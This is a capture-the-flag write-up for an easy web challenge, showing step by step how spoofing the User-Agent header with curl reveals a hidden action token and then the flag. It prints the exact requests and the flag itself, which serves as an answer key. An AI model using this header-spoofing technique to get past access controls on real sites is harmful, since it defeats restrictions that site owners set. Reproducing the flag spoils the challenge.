---
title: reto02
challenge_type: Web
difficulty: Easy
author: "@pedrit"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: This page hides a flag accessible only for certain devices.
connections:
  - url: http://nct25.thehackerconclave.es:26002
---

## Recon

This web challenge centers on device-based access controls. The description states that the flag is accessible only to certain devices, which strongly suggests that `User-Agent` filtering is used as the main access restriction mechanism.

I began by accessing the target URL in a web browser:

![Landing page](/assets/files/navarra-cyber-talent-25-4/reto02/website.png)

The page appears to be themed around Motorola mobile devices. Based on this observation, and suspecting that the website might display different content depending on the device, I decided to test how the page responds when accessed with a spoofed `User-Agent` header.

```
$ diff \
    <(curl -s http://nct25.thehackerconclave.es:26002) \
    <(curl -s -A "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" http://nct25.thehackerconclave.es:26002)
<
---
> <button class="submit-btn" onclick="submitForm('asdfljnquwnel923491234n89')">Get flag</button>
```

Aha! There is a difference: a new button appears, which triggers a JavaScript action when clicked. Upon further investigation in the website's source code, I discovered the `submitForm` function defined in the `/templates/templatemo-electric-scripts.js` file:

```javascript
function submitForm(param) {
    $.ajax({
        url: 'index.php?action=' + param,
        method: 'GET',
        success: function(response) {
            // Handle response
        }
    });
}
```

## Exploitation

Let's make a request to this action endpoint and observe the response:

```bash
$ curl 'http://nct25.thehackerconclave.es:26002/index.php?action=asdfljnquwnel923491234n89'
[Acceso denegado] - Solo disponible para motorola dynatac 8000x
```

We are on the right track, but we encounter an access denied message. The response indicates that access is only available for a **Motorola DynaTAC 8000X**, which was the first commercially available handheld mobile phone, released in 1983.

## Flag capture

This time, let’s spoof our `User-Agent` header to identify as a Motorola DynaTAC 8000X:

```bash
$ curl -A 'motorola dynatac 8000x' 'http://nct25.thehackerconclave.es:26002/index.php?action=asdfljnquwnel923491234n89'
conclave{fc5a8553405b3fcb016f5bafa8fc5e23}
```